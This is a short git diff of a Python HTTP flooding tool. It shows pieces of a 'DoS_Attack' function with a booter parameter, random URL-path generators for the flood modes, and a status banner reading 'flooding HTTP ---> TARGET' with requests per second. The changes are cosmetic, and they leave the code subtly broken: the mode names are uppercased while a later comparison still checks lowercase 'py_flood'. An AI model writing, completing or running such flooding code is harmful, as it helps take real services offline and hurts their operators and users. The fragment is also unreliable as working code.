@@ -22,7 +22,7 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.LIGHTWHITE_EX}f A D H I L {Fore.CYAN}▒ {Fore.YELLOW}HTTP{Fore.CYAN} ▒{Fore.BLUE}=⟩ {Fore.YELLOW}={Fore.LIGHTMAGENTA_EX}TARGET{Fore.YELLOW}={Fore.GREEN}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}▒RPS▒ {Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+    print(f"{Fore.YELLOW}flooding {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
@@ -39,7 +39,7 @@ def generate_url_path_choice(num):
 def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
     rps = 0
     url_path = ''
-    path_get = ['PY_FLOOD','choices_flood']
+    path_get = ['PY_FLOOD','CHOICES_FLOOD']
     path_get_loader = random.choice((path_get))
     if path_get_loader == "py_flood":
         url_path = generate_url_path_pyflooder(5)
